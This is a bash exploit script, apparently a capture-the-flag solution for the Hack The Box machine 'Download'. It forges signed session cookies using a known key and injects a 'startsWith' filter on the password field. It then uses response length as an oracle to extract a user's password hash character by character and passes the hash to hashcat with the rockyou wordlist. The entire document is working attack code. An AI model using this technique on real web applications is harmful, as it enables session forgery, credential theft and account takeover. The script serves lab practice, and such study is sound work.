#!/bin/bash
hash_elements=('0' '1' '2' '3' '4' '5' '6' '7' '8' '9' 'a' 'b' 'c' 'd' 'e' 'f')
extracted_hash=""
hit=0

while [[ $hit -le 32 ]]
do
    for i in ${hash_elements[@]}
    do
	current_state_hash=$extracted_hash$i

	json_data=$(echo "{\"flashes\": {\"info\":[],\"error\":[],\"success\":[]},\"user\":{\"username\":\"WESLEY\",\"password\":{\"startsWith\":\"$current_state_hash\"}}}" | tr -d ' ' )
	echo $json_data > /home/kali/hackthebox/download/cookie-monster/bin/newcookie.json

	/home/kali/hackthebox/download/cookie-monster/bin/cookie-monster.js -e -f /home/kali/hackthebox/download/cookie-monster/bin/newcookie.json -k 8929874489719802418902487651347865819634518936754 -n download_session | grep '+' > /home/kali/tempcookies

	sig=$(cat /home/kali/tempcookies | grep 'sig' | sed -n 's/.*download_session\.sig=\([^ ]*\).*/\1/p' | perl -pe 's/\x1b\[[0-9;]*[mG]//g')
	cookie=$(cat /home/kali/tempcookies | grep -v 'sig' | sed -n 's/.*download_session=\([^ ]*\).*/\1/p' |  perl -pe 's/\x1b\[[0-9;]*[mG]//g')
	content_length=$(curl --keepalive -s -i -I http://download.htb/home -H "Cookie: download_session=$cookie; download_session.sig=$sig" | grep "Content-Length:" | cut -d ' ' -f2 | base64)

	printf "\rProgress: $extracted_hash$i"

	if [[ "$content_length" != "MjE2Ng0K" ]]
	then
	    extracted_hash=$current_state_hash
	    ((hit++))
	    break
	fi
    done
done

rm /home/kali/tempcookies
echo -e  "\n\n\e[32m[+] Pwned!\e[0m Extracted hash is: $extracted_hash\n"
echo -e "Trying to crack it...\n"

hashcat -m 0 "$extracted_hash" /usr/share/wordlists/rockyou.txt
